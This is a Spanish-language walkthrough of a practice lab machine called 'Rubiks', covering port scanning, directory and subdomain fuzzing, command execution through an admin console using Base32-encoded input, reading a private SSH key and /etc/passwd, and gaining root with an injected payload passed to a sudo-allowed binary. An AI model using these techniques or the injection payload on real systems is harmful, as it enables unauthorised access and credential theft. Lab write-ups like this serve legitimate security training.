# MAQUINA RUBIKS

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto.JPG)

Observamos que estan abiertos el puerto 80 y el 22. Vamos a ver el contenido del puerto 80:

![WEB](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto2.JPG)

Para poder visualizar la pagina web deberemos de añadir ese dominio al fichero /etc/hosts:

```shell
127.0.0.1       localhost
127.0.1.1       kali
172.17.0.2      rubikcube.dl
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Si ahora intentamos acceder veremos que si podemos ver el contenido de la web (cuidado, si entramos por HTTPS no podremos, debe ser por HTTP):

![WEB2](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto3.JPG)

Lo siguiente que debremos de hacer sera investigar los diferentes apartados que hay y ver si podemos encontrar algo en el código fuente de alguna de las paginas. No encontramos nada fuera de lo comun, por lo que continuaremos realizando fuzzing utilizando la herramienta gobuster que nos permite listar directorios que a simple vista parecen ocultos:

```shell
gobuster dir -u http://rubikcube.dl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![FUZZ](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto4.JPG)

Ha encontrado un directorio con el nombre administration, vamos a ver que hay en el:

![ADMI](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto5.JPG)

Si navegamos por las diferentes pestañas veremos que hay una con nombre Configuraciones, y dentro de esta pagina aparece un apartado Console, donde puede ser que podamos ejecutar código:

![CON](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto6.JPG)

![ERR](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto7.JPG)

Vaya, vemos que nos da un error, por aqui no es entonces. Sabiendo que tenemos un dominio, vamos a intentar descubrir si existen subdominios utilizando el comando wfuzz:

```shell
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://rubikcube.dl" -H "Host: FUZZ.rubikcube.dl" --hl 9
```

![SUBDO](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto8.JPG)

Vemos que nos ha encontrado un subdominio con nombre administration, vamos a añadirlo al fichero /etc/hosts para ver que hay:

```shell
127.0.0.1       localhost
127.0.1.1       kali
172.17.0.2      rubikcube.dl administration.rubikcube.dl
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Es la misma página que hemos encontrado antes, vamos a probar si por casualidad podemos entrar al apartado que antes no podiamos:

![SAME](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto9.JPG)

Ahora si podemos ejecutar comandos genial, ademas nos dice abajo que deberemos de codificar el comando antes de enviarlo. Para codificar comandos podemos utilizar la herramienta de CyberChef:

https://gchq.github.io/CyberChef/

Como no sabemos en que algoritmo debemos codificar los comandos para que funcionen probaremos primero con los algoritmos mas comunes en estos casos: Base64 y Base32.

Si probamos con Base64 vemos que no nos saca nada, sin embargo, si probamos con Base32 la cosa ya cambia.

![CYBER](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto10.JPG)

![UPS](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto11.JPG)

Ademas, gracias a poner la opcion -a a la hora de hacer el ls estamos viendo los archivos ocultos que hay dentro del directorio, donde podemos destacar ese archivo .id_rsa. Vamos a ver si podemos leer su contenido con el comando cat:

![CYBER2](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto12.JPG)

![NICE](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto13.JPG)

Ole, nos ha dejado leerlo, ahora solo necesitamos saber de que usuario puede ser esa clave. Si hemos podido leer el fichero .id_rsa porque no probamos a leer el fichero /etc/passwd para encontrar el usuario...?

![CASI](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto14.JPG)

![YES](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto15.JPG)

Hay un usuario luisillo que puede interesarnos, vamos a intentar conectarnos por SSH utilizando este usuario y la clave publica de antes, ya que hay que recordar que el puerto 22  estaba abierto.

Antes de conectarnos tendremos que meter el contenido del fichero .id_rsa en un fichero en nuestra maquina atacante y darle los permisos 600 para que a la hora de hacer la conexion no haya errores.

```shell
chmod 600 id_rsa
```

```shell
ssh -i id_rsa luisillo@172.17.0.2
```

![IN](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto16.JPG)

Estamos dentro, pero la terminal se ve un tanto rara, vamos a tratarla con el siguiente comando:

```shell
script /dev/null -c bash
```

Ahora si, ya podemos ponernos a investigar para ver de que modo se puede escalar. No encontramos nada raro en los directorios comunes, por lo que vamos a ejecutar el comando sudo -l para ver que podemos ejecutar como sudo.

Y observamos que podemos ejecutar /bin/cube como cualquier usuario y sin contraseña. Si lo ejecutamos veremos que nos pide introducir un parametro, asi que vamos a probar escalar privilegios aprovechandonos de esto:

```shell
a[$(/bin/bash >&2)]+1
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/Rubiks/foto17.JPG)

Ha funcionado! Ya somos root!
